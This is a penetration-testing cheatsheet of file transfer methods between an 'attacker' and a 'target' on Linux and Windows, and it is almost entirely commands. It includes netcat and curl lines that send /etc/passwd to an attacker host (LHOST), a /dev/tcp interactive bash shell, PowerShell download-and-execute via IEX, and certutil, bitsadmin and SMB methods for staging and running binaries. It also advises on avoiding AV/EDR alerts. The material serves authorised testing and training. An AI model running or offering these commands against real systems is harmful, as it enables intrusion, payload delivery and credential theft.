---
title: File Transfer Cheatsheet
category: reference
last_updated: 2025-12-27
description: Methods for transferring files between attacker and target systems
---

# File Transfer Cheatsheet

Methods for moving files to and from target systems during penetration testing.

---

## Linux File Transfers

### wget

```bash
# Download file
wget http://LHOST/file.txt

# Download to specific location
wget http://LHOST/file.txt -O /tmp/file.txt

# Download silently
wget -q http://LHOST/file.txt

# Download with authentication
wget --user=admin --password=pass http://LHOST/file.txt

# Continue interrupted download
wget -c http://LHOST/largefile.zip

# Download recursively
wget -r http://LHOST/directory/
```

### curl

```bash
# Download and save with original name
curl -O http://LHOST/file.txt

# Download to specific file
curl http://LHOST/file.txt -o /tmp/file.txt

# Download silently
curl -s http://LHOST/file.txt -o file.txt

# Download with authentication
curl -u admin:pass http://LHOST/file.txt -o file.txt

# Follow redirects
curl -L http://LHOST/file.txt -o file.txt

# POST file upload
curl -X POST -F "file=@/etc/passwd" http://LHOST:8080/upload
```

### Netcat

```bash
# On attacker (send file)
nc -lvnp 4444 < file.txt

# On target (receive file)
nc LHOST 4444 > file.txt

# On attacker (receive file)
nc -lvnp 4444 > received_file.txt

# On target (send file)
nc LHOST 4444 < /etc/passwd

# With timeout
nc -w 3 LHOST 4444 > file.txt
```

### Python HTTP Server

```bash
# Python 3 (on attacker)
python3 -m http.server 80
python3 -m http.server 8080 --bind 0.0.0.0

# Python 2 (on attacker)
python -m SimpleHTTPServer 80

# Python upload server
python3 -m uploadserver 8080

# On target (download)
wget http://LHOST/file.txt
curl http://LHOST/file.txt -o file.txt
```

### SCP (Secure Copy)

```bash
# Copy to target
scp file.txt user@TARGET:/tmp/file.txt

# Copy from target
scp user@TARGET:/etc/passwd ./passwd.txt

# Copy with specific port
scp -P 2222 file.txt user@TARGET:/tmp/

# Copy directory recursively
scp -r ./tools user@TARGET:/tmp/

# Using identity file
scp -i id_rsa file.txt user@TARGET:/tmp/
```

### Base64 Encoding

```bash
# On attacker (encode)
base64 -w 0 file.txt > file.b64
cat file.b64

# On target (decode)
echo "BASE64_STRING" | base64 -d > file.txt

# Encode binary
base64 -w 0 shell.elf

# For larger files, copy in chunks
cat file.txt | base64 -w 0
```

### /dev/tcp (Bash)

```bash
# Download file using /dev/tcp
cat < /dev/tcp/LHOST/80 > file.txt

# Execute remote script
bash -c 'bash -i < /dev/tcp/LHOST/80'
```

### PHP Download

```bash
# Using PHP on target
php -r "file_put_contents('file.txt', file_get_contents('http://LHOST/file.txt'));"

# PHP copy function
php -r "copy('http://LHOST/file.txt', '/tmp/file.txt');"
```

### Perl Download

```bash
perl -e 'use File::Fetch; my $ff = File::Fetch->new(uri => "http://LHOST/file.txt"); my $file = $ff->fetch() or die $ff->error;'
```

### Ruby Download

```bash
ruby -e 'require "net/http"; File.write("file.txt", Net::HTTP.get(URI.parse("http://LHOST/file.txt")))'
```

---

## Windows File Transfers

### certutil

```powershell
# Download file
certutil -urlcache -split -f http://LHOST/file.exe file.exe

# Download to specific path
certutil -urlcache -split -f http://LHOST/file.exe C:\Temp\file.exe

# Base64 decode
certutil -decode encoded.txt decoded.exe

# Base64 encode
certutil -encode file.exe encoded.txt
```

### PowerShell Invoke-WebRequest

```powershell
# Basic download (PowerShell 3.0+)
Invoke-WebRequest -Uri http://LHOST/file.exe -OutFile file.exe

# Short alias
iwr http://LHOST/file.exe -o file.exe

# Bypass SSL errors
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
iwr https://LHOST/file.exe -o file.exe

# With credentials
$cred = Get-Credential
iwr http://LHOST/file.exe -OutFile file.exe -Credential $cred
```

### PowerShell DownloadFile

```powershell
# Using WebClient
(New-Object Net.WebClient).DownloadFile('http://LHOST/file.exe','C:\Temp\file.exe')

# Shorter version
(New-Object Net.WebClient).DownloadFile('http://LHOST/file.exe','file.exe')

# Download string and execute
IEX (New-Object Net.WebClient).DownloadString('http://LHOST/script.ps1')

# With proxy
$WebClient = New-Object Net.WebClient
$WebClient.Proxy = New-Object Net.WebProxy('http://proxy:8080',$true)
$WebClient.DownloadFile('http://LHOST/file.exe','file.exe')
```

### PowerShell Start-BitsTransfer

```powershell
# Download file
Start-BitsTransfer -Source http://LHOST/file.exe -Destination file.exe

# Download multiple files
Start-BitsTransfer -Source http://LHOST/file1.exe,http://LHOST/file2.exe -Destination file1.exe,file2.exe

# Asynchronous download
Start-BitsTransfer -Source http://LHOST/largefile.zip -Destination file.zip -Asynchronous
```

### bitsadmin

```cmd
# Download file
bitsadmin /transfer job /download /priority high http://LHOST/file.exe C:\Temp\file.exe

# Create persistent job
bitsadmin /create 1
bitsadmin /addfile 1 http://LHOST/file.exe C:\Temp\file.exe
bitsadmin /resume 1
bitsadmin /complete 1
```

### SMB Server

```bash
# On attacker (start SMB server)
impacket-smbserver share $(pwd) -smb2support

# On attacker (with authentication)
impacket-smbserver share $(pwd) -smb2support -user test -password test

# On target (copy from share)
copy \\LHOST\share\file.exe C:\Temp\file.exe

# On target (execute from share)
\\LHOST\share\file.exe

# Mount SMB share on Windows
net use Z: \\LHOST\share
net use Z: \\LHOST\share /user:test test
```

### FTP

```bash
# On attacker (start FTP server)
python3 -m pyftpdlib -p 21 -w

# On target (Windows FTP client)
ftp LHOST
# Then: binary, get file.exe, bye

# FTP script method
echo open LHOST > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

### Windows curl (Windows 10+)

```cmd
# Download file
curl http://LHOST/file.exe -o file.exe

# Silent download
curl -s http://LHOST/file.exe -o file.exe
```

### VBScript Download

```vbscript
' Save as download.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://LHOST/file.exe", False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile "C:\Temp\file.exe", 2
end with
```

```cmd
# Execute
cscript download.vbs
```

### JavaScript Download

```javascript
// Save as download.js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", "http://LHOST/file.exe", false);
WinHttpReq.Send();
var Stream = new ActiveXObject("ADODB.Stream");
Stream.Open();
Stream.Type = 1;
Stream.Write(WinHttpReq.ResponseBody);
Stream.SaveToFile("C:\\Temp\\file.exe");
```

```cmd
# Execute
cscript download.js
```

---

## Cross-Platform Methods

### Base64 Transfer

```bash
# Linux - Encode
base64 -w 0 file.txt
cat file.bin | base64 -w 0

# Windows - Decode
certutil -decode encoded.txt file.exe
[System.Convert]::FromBase64String("BASE64") | Set-Content file.exe -Encoding Byte

# PowerShell - Decode
[IO.File]::WriteAllBytes("file.exe", [Convert]::FromBase64String("BASE64_STRING"))
```

### Hex Transfer

```bash
# Linux - Encode to hex
xxd -p file.bin | tr -d '\n'

# Linux - Decode from hex
echo "HEX_STRING" | xxd -r -p > file.bin

# PowerShell - Decode from hex
[byte[]]$hex = "48656C6C6F" -split '(..)' | ? { $_ } | % { [convert]::ToByte($_,16) }
[IO.File]::WriteAllBytes("file.txt", $hex)
```

---

## Quick Reference Table

| Method        | Linux | Windows | Notes                    |
|---------------|-------|---------|--------------------------|
| wget          | Yes   | No      | Most common              |
| curl          | Yes   | Win10+  | Versatile                |
| netcat        | Yes   | Manual  | Simple transfers         |
| Python HTTP   | Yes   | Rare    | Quick server setup       |
| SCP           | Yes   | OpenSSH | Secure, needs SSH        |
| certutil      | No    | Yes     | Built-in, may be flagged |
| PowerShell    | No    | Yes     | Multiple methods         |
| bitsadmin     | No    | Yes     | Background transfers     |
| SMB           | Both  | Both    | Great for Windows        |
| FTP           | Both  | Both    | Simple protocol          |
| Base64        | Both  | Both    | For small files          |

---

## Tips

1. **Try multiple methods** - Some may be blocked or unavailable
2. **Check AV/EDR** - certutil and PowerShell downloads may trigger alerts
3. **Use HTTPS** - Avoid plaintext when possible
4. **Living off the land** - Prefer built-in tools over uploading new ones
5. **Size matters** - Base64 works well for small files, SMB/HTTP for large
6. **Proxy awareness** - Corporate environments may require proxy configuration
